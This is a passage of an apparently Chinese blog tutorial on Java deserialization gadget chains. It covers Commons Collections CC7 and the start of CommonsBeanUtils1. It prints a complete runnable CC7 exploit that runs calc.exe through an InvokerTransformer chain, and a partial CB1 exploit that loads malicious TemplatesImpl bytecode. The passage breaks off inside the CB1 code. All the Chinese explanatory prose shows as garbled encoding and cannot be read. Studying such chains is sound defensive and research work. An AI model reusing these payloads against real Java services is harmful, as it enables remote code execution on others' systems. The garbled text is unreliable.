<p>å¯ä»¥çœ‹åˆ°å®ƒåˆ©ç”¨<code>decorate</code>æå‡ºäº†ä¸¤ä¸ª<code>lazymap</code>(EXPä¸­å†™çš„é‚£ä¸ª<code>decorateMap</code>)ï¼Œç„¶åä»–ç»™è¿™ä¸ª<code>map</code>é‡Œåˆ†åˆ«æ”¾äº†é”®<code>yy</code>å’Œ<code>zZ</code>ï¼Œå€¼éƒ½æ˜¯1ã€‚ç„¶åæŠŠè¿™ä¸¤ä¸ªæ¶æ„ç±»éƒ½æ”¾è¿›<code>hashtable</code>é‡Œåæ”¹äº†ä¸‹<code>transformerChain</code>ä¸­<code>iTransfomers</code>çš„å€¼(ä¹Ÿå°±æ˜¯EXPä¸­å†™çš„é‚£ä¸ª<code>chainedTransformer</code>)ã€‚</p>
<p>è¿™é‡Œç›´æ¥æŠŠæ­£ç¡®çš„EXPæ”¾ä¸Šæ¥ï¼Œå¯¹ç…§ç€åˆ†æï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;&#125;;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc7.bin&quot;</span>));<br>            outputStream.writeObject(hashtable);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc7.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨åˆ†æå‰è¯´ä¸‹ä¹‹å‰çš„é—®é¢˜ï¼šå³ä¸ç®¡æ˜¯<code>reconstitutionPut</code>æ–¹æ³•è¿˜æ˜¯<code>equals</code>æ–¹æ³•ï¼Œéƒ½å¾—å…ˆè¿›<code>for</code>å¾ªç¯æ‰è¡Œï¼šè¿™é‡Œä¸»è¦çœ‹<code>hashtable</code>ä¸‹çš„<code>reconstitutionPut</code>ä¸­çš„<code>for</code>å¾ªç¯æ€ä¹ˆæ»¡è¶³ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>reconstitutionPutæ–¹æ³•é¦–å…ˆå¯¹valueè¿›è¡Œä¸ä¸ºnullçš„æ ¡éªŒï¼Œå¦åˆ™æŠ›å‡ºååºåˆ—åŒ–å¼‚å¸¸ï¼Œç„¶åæ ¹æ®keyè®¡ç®—å‡ºå…ƒç´ åœ¨tableæ•°ç»„ä¸­çš„å­˜å‚¨ç´¢å¼•ï¼Œåˆ¤æ–­å…ƒç´ åœ¨tableæ•°ç»„ä¸­æ˜¯å¦é‡å¤ï¼Œå¦‚æœé‡å¤åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚æœä¸é‡å¤åˆ™å°†å…ƒç´ è½¬æ¢æˆEntryå¹¶æ·»åŠ åˆ°tablæ•°ç»„ä¸­ã€‚</p>
<p>CC7åˆ©ç”¨é“¾çš„æ¼æ´è§¦å‘çš„å…³é”®å°±åœ¨reconstitutionPutæ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•åœ¨åˆ¤æ–­é‡å¤å…ƒç´ çš„æ—¶å€™æ ¡éªŒäº†ä¸¤ä¸ªå…ƒç´ çš„hashå€¼æ˜¯å¦ä¸€æ ·ï¼Œç„¶åæ¥ç€keyä¼šè°ƒç”¨equalsæ–¹æ³•åˆ¤æ–­keyæ˜¯å¦é‡å¤æ—¶å°±ä¼šè§¦å‘æ¼æ´ã€‚</p>
<p>æ·»åŠ ç¬¬ä¸€ä¸ªå…ƒç´ æ—¶å¹¶ä¸ä¼šè¿›å…¥ifè¯­å¥è°ƒç”¨equalsæ–¹æ³•è¿›è¡Œåˆ¤æ–­(e &#x3D; e.nextç„¶åç¬¬ä¸€ä¸ªifçš„å†…å®¹æ˜¯<code>e.hash == hash</code>ï¼Œè¦æ˜¯åªæœ‰ä¸€ä¸ªçš„è¯è¿e.nextéƒ½æ²¡æœ‰)ï¼Œå› æ­¤Hashtableä¸­çš„å…ƒç´ è‡³å°‘ä¸º2ä¸ªå¹¶ä¸”å…ƒç´ çš„hashå€¼ä¹Ÿå¿…é¡»ç›¸åŒçš„æƒ…å†µä¸‹æ‰ä¼šè°ƒç”¨equalsæ–¹æ³•ï¼Œå¦åˆ™ä¸ä¼šè§¦å‘æ¼æ´ã€‚</p>
<p>ç„¶åæ³¨æ„è¿™ä¸ª<code>equals</code>æ–¹æ³•ï¼šæœ€ç»ˆåˆ©ç”¨<code>e.key.equals()</code>è°ƒç”¨äº†<code>LazyMap</code>çš„<code>equals</code>æ–¹æ³•(å¾€<code>hashtable</code>ä¸­<code>put</code>äº†lazymapçš„å®ä¾‹)ï¼Œä½†æ˜¯LazyMapä¸­å¹¶æ²¡æœ‰equalsæ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†LazyMapçš„çˆ¶ç±»AbstractMapDecoratorçš„equalsæ–¹æ³•ï¼Œè™½ç„¶AbstractMapDecoratoræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä½†å®ƒå®ç°äº†equalsæ–¹æ³•ã€‚</p>
<p>ç¬¬ä¸€éƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;&#125;;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¼„äº†ä¸¤ä¸ª<code>Transformer</code>æ•°ç»„ï¼Œä¸€ä¸ª<code>fakeTransformers</code>å’Œä¸€ä¸ª<code>transformers</code>ã€‚è¿™é‡Œçš„ç”¨æ³•å’Œæˆ‘ä»¬ä¹‹å‰éšä¾¿æ”¹ä¸ªå€¼é‚£ç§æ–¹æ³•çš„ç›®æ ‡æ˜¯ä¸€æ ·çš„ï¼š</p>
<p><code>put</code>æ—¶åŒæ ·ä¼šè§¦å‘<code>equals</code>æ–¹æ³•ï¼š</p>
<p><img src="/img/putwhat.png" srcset="/img/loading.gif" lazyload alt="putwhat"></p>
<p>å…ˆç”¨è¿™ä¸ª<code>fake</code>ç­‰<code>put</code>å®Œäº†é€šè¿‡åå°„æ”¹å›æ¥å°±è¡Œã€‚</p>
<p>ç¬¬äºŒéƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure>

<p>å…ˆå°†<code>fakeTransformers</code>ä¼ å…¥<code>ChainedTransformer</code>å¯¹è±¡ï¼›</p>
<p> newä¸¤ä¸ª<code>HashMap</code>å¯¹è±¡ï¼Œéƒ½è°ƒç”¨<code>LazyMap.decorate</code>ï¼Œå¹¶ä¸”åˆ†åˆ«å‘ä¸¤ä¸ªå¯¹è±¡ä¸­ä¼ å€¼ï¼Œä¸¤ä¸ªkeyå€¼åˆ†åˆ«ä¸º<code>yy</code>å’Œ<code>zZ</code>ï¼Œå› ä¸ºéœ€è¦è¿™ä¸¤ä¸ªå€¼çš„hashå€¼ç›¸ç­‰ï¼Œè€Œåœ¨javaä¸­ï¼Œ<code>yy</code>å’Œ<code>zZ</code>çš„hashå€¼æ°å¥½ç›¸ç­‰ï¼›</p>
<p><img src="/img/20211031133342-1bd17e2e-3a0c-1.png" srcset="/img/loading.gif" lazyload alt="20211031133342-1bd17e2e-3a0c-1"></p>
<p>ç„¶åå°†è¿™ä¸¤ä¸ªLazyMapç±»å¯¹è±¡putè¿›Hashtableç±»å¯¹è±¡ï¼›</p>
<p>ç¬¬ä¸‰éƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br>lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<span class="hljs-comment">//åˆ é™¤é”®ä¸ºyyçš„é”®å€¼å¯¹</span><br></code></pre></td></tr></table></figure>

<p>å›é¡¾ä¸‹è¿™ä¸ª<code>iTransformers</code>æ˜¯ä»€ä¹ˆï¼š</p>
<p><img src="/img/iTransformers.png" srcset="/img/loading.gif" lazyload alt="iTransformers"></p>
<p>é€šè¿‡åå°„è·å–<code>ChainedTransformer</code>çš„<code>iTransformers</code>å˜é‡ï¼Œå°†å«æœ‰æˆ‘ä»¬ååºåˆ—åŒ–æ—¶è¦æ‰§è¡Œçš„å‘½ä»¤çš„<code>transformers</code>æ•°ç»„ä¼ è¿›å»ï¼Œæ›¿æ¢å‰é¢çš„<code>fakeTransformers</code>ï¼›</p>
<p>ä¸ºä»€ä¹ˆè¦åˆ é™¤<code>lazymap2</code>ä¸­çš„<code>yy</code>é”®å€¼å¯¹ï¼Ÿè¿™ä¸ªé”®å€¼å¯¹æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Ÿ</p>
<p>Hashtableåœ¨è°ƒç”¨putæ–¹æ³•æ·»åŠ å…ƒç´ çš„æ—¶å€™ä¼šè°ƒç”¨equalsæ–¹æ³•åˆ¤æ–­æ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡ï¼Œè€Œåœ¨equalsä¸­ä¼šè°ƒç”¨LazyMapçš„getæ–¹æ³•æ·»åŠ ä¸€ä¸ªå…ƒç´ ï¼ˆyy&#x3D;yyï¼‰ã€‚</p>
<p>å”‰ï¼Œæˆ‘æ˜¯æ‡’ç‹—ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™ä½å¸ˆå‚…çš„åˆ†æï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/119862728">yy&#x3D;yy</a></p>
<p>å¦‚æœä¸æŠŠè¿™ä¸ª<code>yy</code>åˆ æ‰ï¼Œååºåˆ—åŒ–èµ°åˆ°<code>AbstractMap</code>çš„<code>equals</code>æ—¶ï¼š</p>
<p><img src="/img/equal.png" srcset="/img/loading.gif" lazyload alt="equal"></p>
<p>å¯ä»¥çœ‹åˆ°å½“ä¸¤ä¸ª<code>size</code>ä¸ç›¸ç­‰å°±ç›´æ¥è¿”å›<code>False</code>äº†ã€‚</p>
<h2 id="CommonsBeanUtils1"><a href="#CommonsBeanUtils1" class="headerlink" title="CommonsBeanUtils1"></a>CommonsBeanUtils1</h2><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x04-CommonsBeanUtils1-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">å‚è€ƒæ–‡ç« </a></p>
<p>é¦–å…ˆCommons-BeanUtils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• <code>PropertyUtils.getProperty</code> ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Baby.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Baby</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Drunkbaby&quot;</span>;  <br>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> name;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span> <span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//CBMethods.java</span><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CBMethods</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Baby</span>(), <span class="hljs-string">&quot;name&quot;</span>));  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//ç»“æœï¼šDrunkbaby</span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨ç‚¹å°±æ˜¯å¯ä»¥ç”¨è¿™ä¸ªé™æ€æ–¹æ³•å»è°ƒé™æ€ç±»åŠ è½½é‚£ç« ä¸­çš„<code>getOutputProperties()</code>ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>(åŠ¨æ€ç±»åŠ è½½é‚£é‡Œå°±ä¸ç»†è¯´äº†ï¼Œå°±æ˜¯CC3é‚£äº›)</p>
<p><code>BeanComparator.compare()</code> æ–¹æ³•ï¼š</p>
<p><img src="/img/compare.png" srcset="/img/loading.gif" lazyload alt="compare"></p>
<p>è¿™ä¸ªæ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ï¼›å¦‚æœ this.property ä¸ä¸ºç©ºï¼Œåˆ™ç”¨ PropertyUtils.getProperty åˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ this.property å±æ€§ï¼Œæ¯”è¾ƒå±æ€§çš„å€¼ã€‚</p>
<p>æ‰€ä»¥å¦‚æœéœ€è¦ä¼ å€¼æ¯”è¾ƒï¼Œè‚¯å®šæ˜¯éœ€è¦æ–°å»ºä¸€ä¸ª <code>PriorityQueue</code> çš„é˜Ÿåˆ—ï¼Œå¹¶è®©å…¶æœ‰ 2 ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒã€‚è€Œä¸” <code>PriorityQueue</code> çš„æ„é€ å‡½æ•°å½“ä¸­å°±åŒ…å«äº†ä¸€ä¸ªæ¯”è¾ƒå™¨ã€‚</p>
<p><img src="/img/PriorityConstructor.png" srcset="/img/loading.gif" lazyload alt="PriorityConstructor"></p>
<p>æœ€åä½¿ç”¨ queue.add å°±å¯ä»¥è‡ªåŠ¨å®Œæˆæ¯”è¾ƒæ˜¯å› ä¸º add æ–¹æ³•è°ƒç”¨äº† compare æ–¹æ³•ï¼Œå¦‚å›¾</p>
<p><img src="/img/Route.png" srcset="/img/loading.gif" lazyload alt="Route"></p>
<p>æ‰€ä»¥åˆæ­¥EXP:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonBeans1EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br> <span class="hljs-comment">// å°† property çš„å€¼èµ‹ä¸º outputProperties </span><br> setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br> <span class="hljs-comment">// åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç   </span><br> <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);  <br> queue.add(templates);  <span 